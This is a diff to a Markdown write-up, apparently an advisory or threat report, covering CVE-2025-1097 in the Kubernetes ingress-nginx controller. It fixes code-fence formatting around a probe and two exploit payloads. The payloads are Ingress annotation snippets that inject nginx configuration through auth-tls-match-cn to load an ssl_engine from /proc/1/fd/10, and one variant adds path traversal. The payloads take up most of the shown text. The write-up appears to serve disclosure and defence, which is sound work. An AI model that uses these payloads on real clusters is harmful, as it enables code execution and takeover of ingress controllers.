@@ -166,32 +166,38 @@ We can exploit CVE-2025-1097 to inject malicious code into the configuration fil
 
 #### Probing
 
-```"metadata":{
+```
+"metadata":{
   "name":"2vxzygs9d9hpenwzndlbpbqevem-auth-tls",
   "namespace":"default",
   "annotations":{
-    "nginx.ingress.kubernetes.io/auth-tls-match-cn":"CN=abc #(\n){}\n }}\nssl_engine /aaa;\n#```
+    "nginx.ingress.kubernetes.io/auth-tls-match-cn":"CN=abc #(\n){}\n }}\nssl_engine /aaa;\n#
+```
 
 #### Payload 1
 
-```"metadata": {
+```
+"metadata": {
   "name": "2vxzygs9d9hpenwzndlbpbqevem-auth-tls",
   "namespace": "default",
   "annotations": {
     "nginx.ingress.kubernetes.io/auth-tls-match-cn": "CN=abc #(\n){}\n }}\nssl_engine /proc/1/fd/10;\n#",
     "nginx.ingress.kubernetes.io/auth-tls-secret": "calico-system/node-certs",
-    "nginx.ingress.kubernetes.io/backend-protocol": "FCGI"```
+    "nginx.ingress.kubernetes.io/backend-protocol": "FCGI"
+```
 
 #### Payload 2
 
-```"metadata": {
+```
+"metadata": {
   "name": "eumesmo",
   "namespace": "default",
   "creationTimestamp": null,
   "annotations": {
     "nginx.ingress.kubernetes.io/auth-tls-match-cn": "CN=abc #(\n){}\n }}\nssl_engine ../../../../../../proc/1/fd/10;\n#",
     "nginx.ingress.kubernetes.io/auth-tls-secret": "calico-system/node-certs",
-    "nginx.ingress.kubernetes.io/backend-protocol": "FCGI"```
+    "nginx.ingress.kubernetes.io/backend-protocol": "FCGI"
+```
 
 ## Observed in the Wild
 
